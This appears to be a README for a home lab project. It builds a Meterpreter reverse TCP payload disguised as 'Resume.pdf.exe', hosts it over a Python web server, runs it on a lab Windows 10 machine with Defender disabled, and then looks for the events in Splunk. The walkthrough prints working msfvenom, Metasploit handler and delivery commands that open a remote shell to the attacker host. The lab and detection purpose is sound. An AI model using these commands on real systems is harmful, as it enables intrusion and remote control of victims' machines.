# ReverseTCPAttack

## Objective
The ReverseTCPAttack project intends to create an exploit known as a reverse TCP attack in which a server initiates a connection to the host. Splunk is used as a SIEM to analyze data from this attack. This is done in a controlled environment for educational purposes ONLY. 

### Skills Learned
- Payload Generation: Generate different types of payloads using MSFvenom
- Payload Delivery and Execution: Understanding methods for delivering and executing generated payloads on target systems
- Handler Setup: Configuring handlers within Metasploit to receive connections from generated payloads and maintain access to compromised systems.

### Tools Used
- Nmap: Scan a network for open ports 
- MSFvenom: Creation of malware payload
- Metasploit: Receive connections between target device
- Python3: Host malware payload 

## Prerequisites 
Refer to [VirtualBox & Active Directory](https://github.com/Y-Arvin/VirtualBox-ActiveDirectory) for setting up the network that will be used. The first nine and reference 21, will be used as a guide for setting up the network. 

Refer to [Splunk](https://github.com/Y-Arvin/Splunk) for the installation of Splunk with Sysmon olaf configurations. The first ten reference photos will be used as a guide for setting up Splunk with Sysmon olaf configurations. 

## Walkthrough
**Identify Open Ports** <br>
On Kali Linux use Nmap to scan and find all open ports on target PC `192.168.10.100`
```bash
$ nmap -A 192.168.10.100 -Pn
```
> -A = OS detection, version detection, script scanning, and traceroute <br>
> -Pn = Skip host discovery

<img src="https://i.imgur.com/XgL1xxj.png" width="500"> <br> <sup>Ref 1: Nmap scan has found port 3389 RDP to be open </sup>

**Create Malware** <br>
Use msfvenom to list payloads and copy the payload `windows/x64/meterpreter_reverse_tcp`
```bash
$ msfvenom -l payloads
```
Create an executable malware file called `Resume.pdf.exe` using the meterpreter reverse tcp payload using port 4444 
```bash
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.10.250 lport=4444 -f exe -o Resume.pdf.exe
```
> -p = Payload <br>
> -f = File format <br>
> -o = Name of file

<img src="https://i.imgur.com/I1WF6Pd.png" width="500" > <br> <sup>Ref 2: Creation of a reverse tcp payload called Resume.pdf.exe </sup>

**Handler to listen to payload** <br>
In Metasploit use the exploit multi-handler to change the name of the payload to `windows/x64/meterpreter_reverse_tcp` Change lhost to the attacker machine `192.168.10.250` then start the exploit 
```bash
$ msfconsole 
$ use exploit/multi/handler
$ set payload windows/x64/meterpreter_reverse_tcp
$ set lhost 192.168.10.250
$ exploit
```
<img src="https://i.imgur.com/z9RtONS.png.png" width="400" ><img src="https://i.imgur.com/W9bY3QX.png" width="370" > <br> <sup>Ref 3: Change name & Lhost </sup>

**Setup HTTP Server** <br>
Open a new terminal, Change the directory to where the malware is `desktop` Create a web server to host malware with Python using port 9999
```bash
$ cd desktop
$ python3 -m http.server 9999
```
<img src="https://i.imgur.com/dc3wljX.png" width="500" > <br> <sup>Ref 4: Malware file on webserver port 9999 </sup>

## The following will be done on the target Windows 10 machine

**Disable Windows Defender** <br>
Search for Virus & Threat Protection. Click on manage setting protection and disable real-time protection

<img src="https://i.imgur.com/717CdP6.png" width="300" > <br> <sup>Ref 5: Real-time protection settings </sup>

**Visit Webserver to Download and Execute Malware** <br>
Open a web browser and type in `192.168.10.250:9999` <br> Click it and the download will start. <br>
When the malware is executed it will seem nothing has happened however the program is running.

<img src="https://i.imgur.com/ZZeIFyj.png" width="300" > <img src="https://i.imgur.com/ML2iFOp.png" width="370" > <br> <sup>Ref 6: Hosting file & Executable running </sup>

⚠️The file extension is not shown tricking the target into believing this is a `.pdf` file however it is an exe ⚠️ <br>
<img src="https://i.imgur.com/zModtgC.png" width="400" > <img src="https://i.imgur.com/kf8TKNH.png" width="400" > <br> <sup>Ref 7: File name is used to trick the target into thinking the file is a .pdf </sup>

Run command prompt as admin. Find if an active established connection from Linux has been created with the Windows machine 
```bash
netstat -anob 
```
<img src="https://i.imgur.com/nJT4rFJ.png" width="500" > <br> <sup>Ref 8: Established connection from Linux to Windows created by malware file Resume.pdf.exe </sup>

**Connection Made** <br>
On Kali, the meterpreter will also show a connection is made.

<img src="https://i.imgur.com/ObNY20k.png" width="500" > <br> <sup>Ref 9: Connection made from 192.168.10.250 to 192.168.10.100 Windows machine </sup>

**Obtaining information from connected machine**
The command `shell` is used to allow the execution of commands from the Linux to the Windows 10 machine. Other malicious commands can be ran but for this project, just `ipconfig/all` will be used.

<img src="https://i.imgur.com/4uySzJc.png" width="500" > <br> <sup>Ref 10: ipconfig/all is ran on Linux, the information shown reflects the Windows machine  </sup>

**Search events in Splunk** <br>
click on apps at the top and go to searching & reporting in the search bar type in `index=endpoint resume.pdf.exe`. This will search for events that contain `resume.pdf.exe` which was the malware file.

<img src="https://i.imgur.com/F1Tdp7m.png" width="500" > <br> <sup>Ref 11: Performing data query in Splunk </sup>



## Issues
**No events in Splunk** <br>
When searching for events, no events were showing up. Even sorting by the last 15 mins. So, I thought there must have been a time issue with the target PC, Windows 10. The time was set to synchronize with the Windows Server which had shown a different time and seemed to logging the events to Splunk incorrectly.

On the Windows Server, the time server was set to local CMOS clock and the time had been wrong even after setting the timezone correctly.
To resolve this issue I used a command found on a [Reddit post.](https://www.reddit.com/r/sysadmin/comments/lnnmt7/comment/go1h05z/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) This changed the time server to 0.pool.ntp.org, 1.pool.ntp.org, 2.pool.ntp.org instead of the local CMOS clock.

```
sc stop w32time #Stop the service
w32tm /unregister # Clear the registry
w32tm /register # Re-register
sc start w32time # Restart the service
w32tm /config /update /syncfromflags:manual /manualpeerlist:"0.pool.ntp.org 1.pool.ntp.org 2.pool.ntp.org" # Configure NTP client
w32tm /resync /rediscover /nowait # Start NTP sync
w32tm /config /reliable:yes # Make it a reliable NTP Server
``` 

<img src="https://i.imgur.com/SvrnpcP.png" width="500" > <br> <sup>Ref 12: Adjust time server for events to start showing up in Splunk </sup>


-------------------------------------------------------------------
